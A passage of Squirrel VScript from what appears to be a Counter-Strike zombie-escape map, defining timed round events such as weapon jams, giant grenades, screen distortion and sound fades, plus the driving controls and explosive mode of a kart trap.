							//EntFireByHandle(h,"Kill","",ii,null,null);
							
							
						}});
					}
					if(pqq.len()<7)return;
					::ServerSay("say The old stage is unstable",0.00,null);
					::ServerSay("say The old stage is unstable",0.01,null);
					::ServerSay("say The old stage is unstable",0.02,null);
					::ServerSay("say Get out of there before it collapses!",1.03,null);
					::ServerSay("say Get out of there before it collapses!",1.04,null);
					::ServerSay("say Get out of there before it collapses!",1.05,null);
					::ServerSay("say The old stage is collapsing!",startdelay+0.00,null);
					::ServerSay("say The old stage is collapsing!",startdelay+0.01,null);
					::ServerSay("say The old stage is collapsing!",startdelay+0.02,null);
					pqq.push({mapspawnindex=(0+::manager.GetScriptScope().mapspawnindex),function Run(){
							if(::manager.GetScriptScope().mapspawnindex <= (mapspawnindex))	//force TP-move when done (if not already moved), to prevent delays!
							{
								::tpdest.SetOrigin(::MAPDATA[mapspawnindex].start_pos+Vector(0,0,8)+
									(::MAPDATA[mapspawnindex].direction_current*(::manager.GetScriptScope().GRID_SIZE/2))-
									(::MAPDATA[mapspawnindex].direction_current*(::manager.GetScriptScope().BUFFER_SIZE * ::manager.GetScriptScope().GRID_SIZE)));
								::tpdest.SetForwardVector(::MAPDATA[mapspawnindex].direction_current);
							}
						}});
					::Process(pqq,0.02);
				}},
			PHASING={		cost=0,			cancel_mapspawn=false,			allow_in_finale=true,
					time = 20.00,
					tickrate = 2.00,
					alpha = 30,
				active = false,
				ticking = false,
				function Blink(){
					if(!ticking)active = false;
					if(active)EntFire("manager","RunScriptCode"," ::EVENTS.PHASING.Blink(); ",tickrate,null);
					for(local h;h=Entities.FindByName(h,"block_*");)
					{
						if(!active)
						{
							EntFireByHandle(h,"AddOutput","renderamt 255",0.00,null,null);
							if(::NetProps.GetPropInt(h,"m_nRenderMode")==1)
								::NetProps.SetPropInt(h,"m_nRenderMode",0);
						}
						else
						{
							EntFireByHandle(h,"AddOutput","renderamt "+alpha.tostring(),0.00,null,null);
							if(::NetProps.GetPropInt(h,"m_nRenderMode")==0)
								::NetProps.SetPropInt(h,"m_nRenderMode",1);
						}
					}
				},function Run(){
					if(active)return;
					active = true;
					ticking = true;
					EntFire("manager","RunScriptCode"," ::EVENTS.PHASING.Blink(); ",0.00,null);
					EntFire("manager","RunScriptCode"," ::EVENTS.PHASING.ticking = false; ",time,null);
					::ServerSay("say Our eyes are phasing",0.00,null);
					::ServerSay("say We can see through the world",1.00,null);
					::ServerSay("say Tread carefully or wait it out...",2.00,null);
					::ServerSay("say Our eyes are back to normal again",time,null);
						EntFire("skybox_slave","Disable","",0.00,null);		//added in v1_6, the skybox models interfered too much, so just disable them during it
						EntFire("skybox_slave","Enable","",time,null);
				}},
			SILENCE={		cost=0,			cancel_mapspawn=false,			allow_in_finale=true,
					fadetime_start = 15.00,
					fadetime_hold = 15,
					fadetime_end = 10.00,
					time = 20.00,
					tickrate = 0.50,
					only_ct = true,
				active = false,
				ticking = false,
				function Tick(){
					if(!ticking){active=false;return;}
					EntFire("manager","RunScriptCode"," ::EVENTS.SILENCE.Tick(); ",tickrate,null);
					for(local h;h=Entities.FindByClassname(h,"player");)
					{
						if(h==null||!h.IsValid())continue;
						if(only_ct && h.GetTeam()!=3 || only_ct && h.IsAlive()==false)continue;
						local cmd = "soundfade 100 "+(0.30+tickrate).tostring()+" "+(fadetime_end).tostring()+" 0";
						EntFire("client","Command",cmd,0.00,h);
					}
				},function Run(){
					if(active)return;
					active = true;
					ticking = true;
					EntFire("manager","RunScriptCode"," ::EVENTS.SILENCE.Tick(); ",fadetime_start,null);
					EntFire("manager","RunScriptCode"," ::EVENTS.SILENCE.ticking = false; ",fadetime_start+fadetime_hold,null);
					local ho = "";
					if(only_ct)ho="human ";
					::ServerSay("say Our "+ho+"ears are falling deaf...",1.00,null);
					::ServerSay("say Our "+ho+"ears are falling deaf...",2.00,null);
					::ServerSay("say Our "+ho+"ears are falling deaf...",3.00,null);
					::ServerSay("say Our "+ho+"ears are falling deaf...",4.00,null);
					::ServerSay("say Our "+ho+"ears are falling deaf...",5.00,null);
					::ServerSay("say Our "+ho+"ears are starting to work again!",fadetime_start+fadetime_hold+1.00,null);
					for(local h;h=Entities.FindByClassname(h,"player");)
					{
						if(h==null||!h.IsValid())continue;
						if(only_ct && h.GetTeam()!=3 || only_ct && h.IsAlive()==false)continue;
						local cmd = "soundfade 100 2 1 "+(fadetime_start).tostring();
						EntFire("client","Command",cmd,0.00,h);
					}
				}},
			WEAPON_JAM={		cost=0,			cancel_mapspawn=false,			allow_in_finale=true,
					time = 9.00,
					tickrate = 0.30,
					reserve_amount = 5000,		//set to 'null' to ignore this, it was hardcoded to '10' before which caused issues with reload
					excludelist = [
							"weapon_hegrenade",
						],
				active = false,
				ticking = false,
				function Tick(){
					if(!ticking){active=false;return;}
					EntFire("manager","RunScriptCode"," ::EVENTS.WEAPON_JAM.Tick(); ",tickrate,null);
					for(local h;h=Entities.FindByClassname(h,"weapon_*");)
					{
						if(h==null||!h.IsValid())continue;
						local exclude = false;
						foreach(ex in excludelist){if(h.GetClassname()==ex){exclude=true;break;}}
						if(exclude)continue;
						
						
						//__CSS__ new fancy netprops and shit, replacing this
						//EntFireByHandle(h,"SetAmmoAmount","0",0.00,null,null);
						if(::EVENTS.WEAPON_JAM.reserve_amount!=null)
							//EntFireByHandle(h,"SetReserveAmmoAmount",::EVENTS.WEAPON_JAM.reserve_amount.tostring(),0.00,null,null);
							::SetWeaponAmmo(h,0,::EVENTS.WEAPON_JAM.reserve_amount);
						else
							::SetWeaponAmmo(h,0,null);
					
					}
				},function Run(){
					if(active)return;
					active = true;
					ticking = true;
					EntFire("manager","RunScriptCode"," ::EVENTS.WEAPON_JAM.Tick(); ",0.00,null);
					EntFire("manager","RunScriptCode"," ::EVENTS.WEAPON_JAM.ticking = false; ",time,null);
					::ServerSay("say Weapons jammed - RELOAD!",0.00,null);
					::ServerSay("say Weapons jammed - RELOAD!",0.01,null);
					::ServerSay("say Weapons jammed - RELOAD!",0.02,null);
					::ServerSay("say Weapons jammed - RELOAD!",0.03,null);
					::ServerSay("say Weapons jammed - RELOAD!",0.04,null);
				}},
			WALLBREAK={		cost=0,			cancel_mapspawn=false,			allow_in_finale=true,
					run_delay = 7.00,
				active = false,
				function RunPost(){
					EntFire("manager","RunScriptCode"," ::EVENTS.WALLBREAK.active = false; ",3.00,null);
					::ServerSay("say All the 'WALL' tiles are disappearing!",0.00,null);
					::ServerSay("say All the 'WALL' tiles are disappearing!",0.01,null);
					::ServerSay("say All the 'WALL' tiles are disappearing!",0.02,null);
					local themes = [];
					foreach(t,k in ::THEMES)themes.push(""+t);
					foreach(theme in themes)
					{
						foreach(model in ::TILEVARIANTS.WALL[theme].main)
						{
							for(local h;h=Entities.FindByModel(h,model);)
							{
								EntFireByHandle(h,"AddOutput","renderamt 200",0.00,null,null);
								EntFireByHandle(h,"AddOutput","renderamt 150",0.50,null,null);
								EntFireByHandle(h,"AddOutput","renderamt 100",1.00,null,null);
								EntFireByHandle(h,"AddOutput","renderamt 50",1.50,null,null);
								EntFireByHandle(h,"AddOutput","renderamt 20",2.00,null,null);
								EntFireByHandle(h,"Kill","",2.50,null,null);
							}
						}
					}
					for(local h;h=Entities.FindByModel(h,"models/luffaren/collective_hiddenwall.mdl");)
					{
						EntFireByHandle(h,"AddOutput","renderamt 200",0.00,null,null);
						EntFireByHandle(h,"AddOutput","renderamt 150",0.50,null,null);
						EntFireByHandle(h,"AddOutput","renderamt 100",1.00,null,null);
						EntFireByHandle(h,"AddOutput","renderamt 50",1.50,null,null);
						EntFireByHandle(h,"AddOutput","renderamt 20",2.00,null,null);
						EntFireByHandle(h,"Kill","",2.50,null,null);
					}
				},function Run(){
					if(active)return;
					active = true;
					EntFire("manager","RunScriptCode"," ::EVENTS.WALLBREAK.RunPost(); ",::EVENTS.WALLBREAK.run_delay,null);
				}},
			BIGNADES={		cost=10,			cancel_mapspawn=false,			allow_in_finale=true,
					time = 40.00,
					tickrate = 0.03,
					modelscale = 4.00,
					blowtime = 1.40,
					hit_range = 600,
					damage = 5000,
					ignite_time = 10.00,
					fling_zpos_offset = -100,
					fling_velocity = 900,
					boss_scan_range = 700,
					boss_damage = 5000,
					boss_stunchance = 60.00,
					boss_stuntime_add = 5.00,
					fx_limit = 5,
				active = false,
				ticking = false,
				fx_amt = 0,
				function Explode(pos,throwing_player=null){
					for(local h;h=Entities.FindByClassnameWithin(h,"player",pos,hit_range);)
					{
						if(h==null||!h.IsValid()||h.GetTeam()!=2||h.IsAlive()==false)continue;
						h.ValidateScriptScope();
						if("invincible" in h.GetScriptScope())continue;
						local dist = ::GetDistance(h.GetOrigin(),pos);
						local percamt = 1.00-(dist/hit_range);
						if(percamt<=0.00)continue;
						if(percamt>=1.00)percamt=1.00;
						local dir = h.GetOrigin()-(pos+Vector(0,0,fling_zpos_offset));
						dir.Norm();
						h.SetVelocity(dir*(fling_velocity*percamt));
						local newhp = h.GetHealth()-((0.00+damage)*percamt);
						newhp = newhp.tointeger();
						if(newhp<=0)::HurtPlayer(h,999999,pos,500,throwing_player,"bignades");
						else
						{
							h.SetHealth(newhp);
							if(ignite_time>0.00)EntFireByHandle(h,"IgniteLifeTime",ignite_time.tostring(),0.00,null,null);
						}
					}
					::HurtStunBoss(	pos,
									::EVENTS.BIGNADES.boss_scan_range,
									::EVENTS.BIGNADES.boss_damage,
									::EVENTS.BIGNADES.boss_stunchance,
									::EVENTS.BIGNADES.boss_stuntime_add);
					if(::EVENTS.BIGNADES.fx_amt >= ::EVENTS.BIGNADES.fx_limit)return;
					::EVENTS.BIGNADES.fx_amt++;
					EntFire("manager","RunScriptCode"," ::EVENTS.BIGNADES.fx_amt--; ",0.05,null);
					::Sound("*luffaren/nadehit.mp3",pos,null,10000,0.04,RandomInt(50,100),10);
					::Sound("*luffaren/punch.mp3",pos,null,10000,0.04,RandomInt(50,60),10);
					::Particle("blood_impact_green_02_chunk",pos,Vector(0,RandomInt(0,360),0),null,0.04);
					::Particle("water_splash_01_refract",pos,Vector(0,RandomInt(0,360),0),null,0.04);
					::Particle("muzzle_rifles",pos,Vector(0,RandomInt(0,360),0),null,0.04);
				},function Tick(){
					if(!ticking){active=false;return;}
					EntFire("manager","RunScriptCode"," ::EVENTS.BIGNADES.Tick(); ",tickrate,null);
					for(local h;h=Entities.FindByClassname(h,"hegrenade_projectile");)
					{
						if(h==null||!h.IsValid())continue;
						h.ValidateScriptScope();
						if("bignade_marked" in h.GetScriptScope())continue;
						
						h.__KeyValueFromFloat("modelscale",modelscale);
						h.GetScriptScope().bignade_marked <- true;
							local estimated_playerpos = h.GetOrigin();
							local nvdir = h.GetVelocity();
							nvdir *= -1;
							nvdir.Norm();
							estimated_playerpos.z -= 58;
							estimated_playerpos += (nvdir*20);
								//DebugDrawBox(estimated_playerpos,Vector(-5,-5,-5),Vector(5,5,5),255,0,0,255,2.00);
							local estimated_player = Entities.FindByClassnameNearest("player",estimated_playerpos,48);
						//h.PrecacheModel("models/luffaren/vauff_world_eater.mdl");
						h.SetModel("models/luffaren/vauff_world_eater.mdl");
						Ent(Vector(),Vector(),"logic_relay",{},{
							estimated_player = estimated_player,
							master = h,
							blow = false,
							lastpos = null,
							function Tick(){
								if(blow||master==null||!master.IsValid())
								{
									EntFireByHandle(self,"Kill","",0.00,null,null);
									if(master==null||!master.IsValid()){}else EntFireByHandle(master,"Kill","",0.00,null,null);
									if(lastpos==null)return;
									::EVENTS.BIGNADES.Explode(lastpos,estimated_player);
									return;
								}
								EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.02,null,null);
								if(::GetDistance(master.GetOrigin(),lastpos)<0.02){blow=true;return;}
								lastpos = master.GetOrigin();
							},function Run(){
								lastpos = master.GetOrigin();
								EntFireByHandle(self,"RunScriptCode"," Tick(); ",0.02,null,null);
								EntFireByHandle(self,"RunScriptCode"," blow = true; ",::EVENTS.BIGNADES.blowtime,null,null);
							}});
					}
				},function Run(){
					if(active)return;
					if(!::MOTHER_ZOMBIE_SPAWNED)return;
					active = true;
					ticking = true;
					EntFire("manager","RunScriptCode"," ::EVENTS.BIGNADES.Tick(); ",0.00,null);
					EntFire("manager","RunScriptCode"," ::EVENTS.BIGNADES.ticking = false; ",time,null);
					::ServerSay("say Our grenades are big and strong!",0.00,null);
					::ServerSay("say Our grenades are big and strong!",0.01,null);
					::ServerSay("say Our grenades are big and strong!",0.02,null);
					::ServerSay("say Maybe too powerful.. beware knockback!",1.03,null);
					::ServerSay("say Maybe too powerful.. beware knockback!",1.04,null);
					::ServerSay("say Maybe too powerful.. beware knockback!",1.05,null);
					::ServerSay("say Our grenades are back to normal now...",time+0.00,null);
				}},
			DOORHUG_BOMB={		cost=2,			cancel_mapspawn=false,			allow_in_finale=false,
					magnitude = 3000,
					radiusoverride = 500,
					explode_time = 1.20,
					modelscale = 10.00,
					soundspam_pre = 10,
					soundspam_explosion = 3,
					dist_offset = 200,				//was 90 in v1_6,	higher/positive: further AWAY from current stage/TOWARDS new stage
				active = false,
				function RunPost(){
					local spos = Vector(0,0,64)+::MAPDATA[::manager.GetScriptScope().mapspawnindex].start_pos+
						(::MAPDATA[::manager.GetScriptScope().mapspawnindex].direction_current*
						(-(::manager.GetScriptScope().BUFFER_SIZE*::manager.GetScriptScope().GRID_SIZE)+dist_offset));
					local srot = ::DirToAngles(::MAPDATA[::manager.GetScriptScope().mapspawnindex].direction_current)+Vector(-25,180,0);
					//::manager.PrecacheModel("models/luffaren/vauff_world_eater.mdl");
					::Ent(spos,srot,"prop_dynamic",{
							model = "models/luffaren/vauff_world_eater.mdl",
							modelscale = 15.00,
							rendermode = 1,
							rendercolor = "255 0 0",
							renderamt = 0,
							glowenabled = 1,
							glowstyle = 1,
							glowdist = 10000,
							glowcolor = "200 100 0",
						},{
						delay = (0.00+explode_time),
						function Explode(){
							::Ent(self.GetOrigin()+Vector(0,0,-32),Vector(),"env_explosion",{
									//fireballsprite = "sprites/zerogxplode.spr", //__CSS__ this shouldnt be needed
									iMagnitude = (0+::EVENTS.DOORHUG_BOMB.magnitude),
									iRadiusOverride = (0+::EVENTS.DOORHUG_BOMB.radiusoverride),
									rendermode = 5,
									spawnflags = 2,
									rendercolor = "255 255 255",
								},{function Run(){
									EntFireByHandle(self,"Explode","",0.01,null,null);
									EntFireByHandle(self,"Kill","",0.05,null,null);
								}});
							for(local i=0;i<::EVENTS.DOORHUG_BOMB.soundspam_explosion;i++)
							{
								::Sound("*luffaren/stuka_boom.mp3",self.GetOrigin(),null,20000,0.20,RandomInt(200,255),10);
								::Sound("*luffaren/stuka_boomx.mp3",self.GetOrigin(),null,100000,0.20,RandomInt(200,255),10);
							}
							::Particle("bomb_explosion_huge",self.GetOrigin(),Vector(0,RandomInt(0,360),0),null,0.10);
						},function Run(){
							EntFireByHandle(self,"RunScriptCode"," Explode(); ",delay,null,null);
							EntFireByHandle(self,"Kill","",delay+0.05,null,null);
							for(local i=0;i<::EVENTS.DOORHUG_BOMB.soundspam_pre;i++)
								::Sound("*luffaren/fuggin_open.mp3",self.GetOrigin(),null,10000,0.20,RandomInt(60,100),10);
							local ii=0.00;
							for(local alpha=0;alpha<255;alpha+=15)
							{
								EntFireByHandle(self,"AddOutput","renderamt "+alpha.tostring(),ii,null,null);
								ii += 0.02;
							}
							EntFireByHandle(self,"AddOutput","renderamt 255",ii,null,null);
						}});
				},function Run(){
					if(active)return;
					if(::manager.GetScriptScope().mapspawnindex<=1)return;
					active = true;
					EntFire("manager","RunScriptCode"," ::EVENTS.DOORHUG_BOMB.active = false; ",explode_time+0.50,null);
					EntFire("manager","RunScriptCode"," ::EVENTS.DOORHUG_BOMB.RunPost(); ",0.05,null);	//was 0.10 in v1_6
					::ServerSay("say Woah, doorhuggers watch out!",0.00,null);
					::ServerSay("say Woah, doorhuggers watch out!",0.01,null);
					::ServerSay("say Woah, doorhuggers watch out!",0.02,null);
				}},
			DISTORT={		cost=0,			cancel_mapspawn=false,			allow_in_finale=true,
					time = 15.00,
					tickrate = 1.00,
					only_ct = true,
				active = false,
				ticking = false,
				function Tick(){
					if(!ticking)
					{
						active=false;
						for(local h;h=Entities.FindByClassname(h,"player");)
						{
							if(h==null||!h.IsValid())continue;
							EntFire("client","Command","r_screenoverlay xxxx",0.02,h);
							EntFire("client","Command","r_screenoverlay ",0.05,h);
							::NetProps.SetPropInt(h,"m_iFOV",0);
						}
						return;
					}
					EntFire("manager","RunScriptCode"," ::EVENTS.DISTORT.Tick(); ",tickrate,null);
					for(local h;h=Entities.FindByClassname(h,"player");)
					{
						if(h==null||!h.IsValid())continue;
						if(only_ct && h.GetTeam()!=3 || only_ct && h.IsAlive()==false)
						{
							EntFire("client","Command","r_screenoverlay xxxx",0.02,h);
							EntFire("client","Command","r_screenoverlay ",0.05,h);
							::NetProps.SetPropInt(h,"m_iFOV",0);
							continue;
						}
						EntFire("client","Command","r_screenoverlay luffaren/overlay_wonky",0.00,h);
						local fov = RandomInt(130,150);
						::NetProps.SetPropInt(h,"m_iFOV",fov);
					}
				},function Run(){
					if(active)return;
					active = true;
					ticking = true;
					EntFire("manager","RunScriptCode"," ::EVENTS.DISTORT.Tick(); ",0.00,null);
					EntFire("manager","RunScriptCode"," ::EVENTS.DISTORT.ticking = false; ",time,null);
					local ho = "";
					if(only_ct)ho="human ";
					::ServerSay("say Our "+ho+"eyes are tripping out...",0.00,null);
					::ServerSay("say Our "+ho+"eyes are back to normal",time,null);
				}},
};










::TRAPS <- {//::Ent(pos,rot,classname,keyvalues,script);
	//xxxxxxxxxxx = {
	//		
	//	function Spawn(pos){
	//		//WITHIN ::ENT-Initialize-logic:
	//			//::CreateCostCleaner(handle,COST);
	//			//::CreateTemCleaner(........);
	//	}
	//},
	kart = {
			z_hpcap = 50,				//what to cap zombie-hp to, to safeguard against danger and bullshit
			jihad_enabled = true,		//set to 'true' to enable T-based jihad
			jihad_range = 50,			//the distance the kart must be next to a CT in order to jihad-explode (while a T is driving)
			jihad_magnitude = 1200,		//explosion magnitude
			jihad_override = 350,		//explosion radius override
			lock_getoff = false,		//set to 'true' to lock getting out by looking down (use for RACE ending)
			velocity_cap = 700,
			velocity_cap_rev = 300,		//__CSS__ reverse speed cap
			drive_vel_baseadd = 30,
			enable_jumping = true,		//set to 'true' to enable jumping by looking straight up
				//V1_8:	('turn_deadzone' 0.50) ('turn_multiplier' 0.10) ('turn_max' 8.00)
			turn_deadzone = 1.00,
			turn_multiplier = 0.06,
			turn_max = 8.00,
			new_controls = true,		//__CSS__ introduces 3rd person + WASD controls (space to jump, ctrl to get off, hold-shift to mouse-turn) - false does OG mouse-controls
			
			
		function Spawn(pos,rot=Vector(),phandle=null,start_frozen=false,t_hpcap=null)
		{
			if(t_hpcap==null)t_hpcap = z_hpcap;
			rot.y -= 90;
			//::manager.PrecacheModel("models/luffaren/luffaren_kart.mdl");
			::Ent(pos,rot,"hegrenade_projectile",{targetname="kart"},{
				ticking = true,
				phandle = phandle,
				drive_vel_accel = 0.00,
				drive_vel = 0,
				drive_turn = 0,
				getoncd = 0.00,
				jump = false,
				jumpcd = 0.00,
				t_hpcap = t_hpcap,
				start_frozen = start_frozen,
				viewcontrol = null,			//__CSS__ 3rd person viewcontrol handle, created/deleted while kart is in use (only if '::TRAPS.kart.new_controls' is enabled)
				function Clean(killplayer=false){
					ticking = false;
					EntFireByHandle(self,"Kill","",0.15,null,null);
					if(phandle==null||!phandle.IsValid())return;
					local kphandle = phandle;
					GetOff();
					if(killplayer)::HurtPlayer(kphandle,true);
				},function GetOn(player){
					if(!ticking)return;
					if(getoncd > 0.00)return;
					if(phandle==null||!phandle.IsValid()){}else return;
					if(player==null||!player.IsValid())return;
					if(player.GetMoveParent()!=null)return;
					player.ValidateScriptScope();
					if(("kart_geton_cd" in player.GetScriptScope()))return;
					phandle = player;
					phandle.SetOrigin(self.GetOrigin()+Vector(0,0,-40));
					phandle.SetVelocity(Vector());
					EntFireByHandle(phandle,"SetParent","!activator",0.00,self,null);
					EntFireByHandle(phandle,"AddOutput","movetype 0",0.00,null,null);
					phandle.GetScriptScope().kart_geton_cd <- true;
					EntFireByHandle(phandle,"RunScriptCode","if(\"kart_geton_cd\" in this)delete kart_geton_cd;",0.05,null,null);
					phandle.SetAngles(40,90,0);
					if(::TRAPS.kart.new_controls)
					{
						if(viewcontrol == null || !viewcontrol.IsValid())
							viewcontrol = ::ViewcontrolCreate();
						::ViewcontrolSet(phandle,viewcontrol);
						AddThinkToEnt(self,"TickSteeringNew");
					}
				},function GetOff(){
					drive_turn = 0;
					jump = false;
					if(!::TRAPS.kart.new_controls)drive_vel_accel = -0.50;
					if(viewcontrol != null && viewcontrol.IsValid())
						viewcontrol.AcceptInput("Kill","",null,null);
					viewcontrol = null;
					if(phandle==null||!phandle.IsValid())return;
					EntFireByHandle(phandle,"ClearParent","",0.00,null,null);
					EntFireByHandle(phandle,"ClearParent","",0.10,null,null);
					EntFireByHandle(phandle,"AddOutput","movetype 2",0.00,null,null);
					EntFireByHandle(phandle,"AddOutput","movetype 2",0.10,null,null);
					EntFireByHandle(phandle,"RunScriptCode","self.SetOrigin(self.GetOrigin()+Vector(0,0,60));",0.05,null,null);
					phandle.GetScriptScope().kart_geton_cd <- true;
					EntFireByHandle(phandle,"RunScriptCode","if(\"kart_geton_cd\" in this)delete kart_geton_cd;",1.00,null,null);
					EntFireByHandle(self,"RunScriptCode","GetOffPostCheck();",0.10,phandle,null);
					ClientPrint(phandle,4,"");
					phandle = null;
					getoncd = 0.50;
				},function GetOffPostCheck(){
					if(activator==null||!activator.IsValid())return;
					if((activator.GetVelocity().tostring()=="(vector : (0.000000, 0.000000, -6.250000))") || 
						activator.GetOrigin().x > 16000 || activator.GetOrigin().x < -16000 || 
						activator.GetOrigin().y > 16000 || activator.GetOrigin().y < -16000 || 
						activator.GetOrigin().z > 16000 || activator.GetOrigin().z < -14000)
							::HurtPlayer(activator,true);
				},function TickElevatorSlay(){
					if(!ticking)return;
					EntFireByHandle(self,"RunScriptCode","TickElevatorSlay();",3.00,null,null);
					foreach(k,v in ::TILEVARIANTS.ELEVATOR)
					{
						foreach(model in ::TILEVARIANTS.ELEVATOR[k].main)
						{
							for(local h;h=Entities.FindByModel(h,model);)
							{
								if(h==null||!h.IsValid())continue;
								if(::GetDistance(h.GetOrigin(),self.GetOrigin()) > 85)continue;
								if(h.GetOrigin().z > self.GetOrigin().z)
								{
									Clean(true);
									break;
								}
							}
						}
					}
				},
				function TickSteeringNew(){				//__CSS__ all of this belongs to the new_controls
					if(!::TRAPS.kart.new_controls){
						AddThinkToEnt(self,"");
						return 1.00;
					}
					if(phandle==null||!phandle.IsValid())return 0.50;
					local pressed = ::GetKeysPressed(phandle);
					if(pressed.CTRL && !::TRAPS.kart.lock_getoff){GetOff();return 1.00;}
					if(viewcontrol == null || !viewcontrol.IsValid())viewcontrol = ::ViewcontrolCreate();
					if(pressed.SPACE)jump = true;
					else jump = false;
					
					local jgof = "\nSPACE: jump  |  CTRL:get off";
					if(::TRAPS.kart.lock_getoff)jgof = "";
					ClientPrint(phandle,4,"WASD: drive   | speed: "+drive_vel_accel.tostring()+jgof+"\nHOLD SHIFT:   mouse-steering");
					
					local vel = 0.00 + drive_vel_accel;
					local turn = 0.00 + drive_turn;
					
					local accel_rate = 5.00;
					local brake_rate = 10.00;
					local deaccel_rate = 3.00;
					local turn_rate = 0.80;
					local turn_deaccel_rate = 0.80;
					
					if(pressed.W)
						vel += accel_rate;
					if(pressed.S)
						vel -= brake_rate;
					if(!pressed.W && !pressed.S)
					{
						if(vel > 0){vel -= deaccel_rate;if(vel < 0)vel=0.00;}
						else if(vel < 0){vel += deaccel_rate;if(vel > 0)vel=0.00;}
					}
					if(vel > ::TRAPS.kart.velocity_cap)vel = 0.00+::TRAPS.kart.velocity_cap;
					else if(vel < -::TRAPS.kart.velocity_cap_rev)vel = 0.00 + -::TRAPS.kart.velocity_cap_rev;
					
					//if(vel < 0.00) turn_rate *= -1;		//might confuse players, probably
					
					if(pressed.SHIFT)
					{
						local kang = self.GetAngles();
						kang.y -= 90;
						local rdif = ::AngleDifference(kang,phandle.EyeAngles()).y;
						local isneg = false;
						if(rdif < 0)isneg = true;
						rdif = fabs(rdif);
						rdif -= (360-rdif);
						rdif = fabs(rdif);
						rdif *= ::TRAPS.kart.turn_multiplier;
						if(rdif >= ::TRAPS.kart.turn_deadzone)
						{
							rdif -= ::TRAPS.kart.turn_deadzone;
							if(rdif > ::TRAPS.kart.turn_max)rdif = (0.00+::TRAPS.kart.turn_max);
							if(rdif<=0.00)rdif=0.00;
						}
						else rdif = 0.00;
						if(isneg)turn = (rdif);
						else turn = -(rdif);
					}
					else
					{
						if(pressed.A)
							turn += turn_rate;
						if(pressed.D)
							turn -= turn_rate;
						if(!pressed.A && !pressed.D)
						{
							if(turn > 0){turn -= turn_deaccel_rate;if(turn < 0)turn=0.00;}
							else if(turn < 0){turn += turn_deaccel_rate;if(turn > 0)turn=0.00;}
						}
					}
					
					if(turn > ::TRAPS.kart.turn_max)turn = 0.00 + ::TRAPS.kart.turn_max;
					else if(turn < -::TRAPS.kart.turn_max)turn = 0.00 + -::TRAPS.kart.turn_max;
					
					
					
					
					local targetpos = phandle.EyePosition() - (phandle.EyeAngles().Forward() * 50) + (phandle.EyeAngles().Left() * 20);
					local targetrot = phandle.EyeAngles();
					
					if(phandle.GetMoveParent() != null)
					{
						if(viewcontrol.GetMoveParent() == null)
							viewcontrol.AcceptInput("SetParent","!activator",phandle.GetMoveParent(),null);
						
						
						targetrot = ::DirToAngles(phandle.EyeAngles().Forward())+Vector(0,0,0);
						if(targetrot.x > 180 && targetrot.x < 290)targetrot.x = 290;
						else if(targetrot.x < 180 && targetrot.x > 80)targetrot.x = 80;
						
						
						local edir = ::AnglesToDir(targetrot);
						edir.z *= 0.80;
						if(edir.z > -0.10)edir.z = -0.10;
						edir.Norm();
						targetpos = phandle.EyePosition() - (edir * 100) + Vector(0,0,20);
						
					}
					
					viewcontrol.SetAbsOrigin(targetpos);
					viewcontrol.SetAbsAngles(QAngle(targetrot.x,targetrot.y,targetrot.z));
					
					
					
					
					drive_vel_accel = vel;
					drive_turn = turn;
					
					return -1;
				},
				function TickPlayerLook(){
					if(!ticking || ::TRAPS.kart.new_controls)return;
					EntFireByHandle(self,"RunScriptCode","TickPlayerLook();",0.10,null,null);
					if(phandle==null||!phandle.IsValid())return;
					local pphand = phandle;
					::EyeTrace(phandle,{kart=self,function Run(player,dir,rot){
							if(dir.z <= -0.98 && !::TRAPS.kart.lock_getoff)kart.GetScriptScope().GetOff();
							if(dir.z >= 0.98)kart.GetScriptScope().jump = true;
							else kart.GetScriptScope().jump = false;
							kart.GetScriptScope().drive_vel_accel = (dir.z+0.20);
							local kang = kart.GetAngles();
							kang.y -= 90;
							local rdif = ::AngleDifference(kang,rot).y;
							local isneg = false;
							if(rdif < 0)isneg = true;
							rdif = fabs(rdif);
							rdif -= (360-rdif);
							rdif = fabs(rdif);
							rdif *= ::TRAPS.kart.turn_multiplier;
							if(rdif >= ::TRAPS.kart.turn_deadzone)
							{
								rdif -= ::TRAPS.kart.turn_deadzone;
								if(rdif > ::TRAPS.kart.turn_max)rdif = (0.00+::TRAPS.kart.turn_max);
								if(rdif<=0.00)rdif=0.00;
							}
							else rdif = 0.00;
							if(isneg)kart.GetScriptScope().drive_turn = (rdif);
							else kart.GetScriptScope().drive_turn = -(rdif);
						}});
					if(::TRAPS.kart.jihad_enabled)
					{
						if(::MOTHER_ZOMBIE_SPAWNED && !::round_ended && pphand.GetTeam()==2)
						{
							for(local h;h=Entities.FindByClassnameWithin(h,"player",self.GetOrigin(),::TRAPS.kart.jihad_range);)
							{
								if(h==null||!h.IsValid()||h.GetTeam()!=3||h.IsAlive()==false)continue;
								::Sound("*luffaren/explode_1.mp3",self.GetOrigin()+Vector(0,0,4),null,20000,0.20,RandomInt(95,105),10);
								::Sound("*luffaren/explode_4.mp3",self.GetOrigin()+Vector(0,0,4),null,50000,0.20,RandomInt(45,55),10);
								::Particle("water_splash_01_refract",self.GetOrigin()+Vector(0,0,4),Vector(),null,0.10);
								if(::ENDINGS.RACE.safe_jihad_aoe)
								{
									::HurtPlayer(h,true);
									break;
								}
								Clean(true);
								::Ent(self.GetOrigin()+Vector(0,0,8),Vector(),"env_explosion",{
										//fireballsprite = "sprites/zerogxplode.spr", //__CSS__ this shouldnt be needed
										iMagnitude = ::TRAPS.kart.jihad_magnitude,
										iRadiusOverride = ::TRAPS.kart.jihad_override,
										rendermode = 5,
										spawnflags = 2,
										rendercolor = "255 255 255",
									},{
									_user = pphand,
									function Run(){
									
										::ITEMS.bomb_chuck.explosion_owner = this._user;			//yoinked for killcreds
										::ITEMS.bomb_chuck.explosion_handle = self;					//yoinked for killcreds
										EntFireByHandle(self,"Explode","",0.01,null,null);
										EntFireByHandle(self,"Kill","",0.05,null,null);
										
									}});
								break;
							}
						}
					}
				},function Tick(){
					if(!ticking){EntFireByHandle(self,"RunScriptCode","Clean();",0.00,null,null);return;}
					EntFireByHandle(self,"RunScriptCode","Tick();",0.02,null,null);
					if(self.GetOrigin().z < -12000)
					{
						if(phandle==null||!phandle.IsValid()||phandle.IsAlive()==false||phandle.GetTeam()!=2)
							Clean(true);
						else if(::ENDINGS.RACE.tpback_fallen_z)
						{
							self.SetOrigin(::ENDINGS.RACE.startpoint+(::ENDINGS.RACE.startdir*300)+(::ENDINGS.RACE.startdirleft*(RandomFloat(-150,150)))+Vector(0,0,40));
							local sty = 0+::ENDINGS.RACE.startrot.y.tointeger().tostring();
							EntFireByHandle(phandle,"RunScriptCode","self.SetAngles(0,90,0);",0.10,null,null);
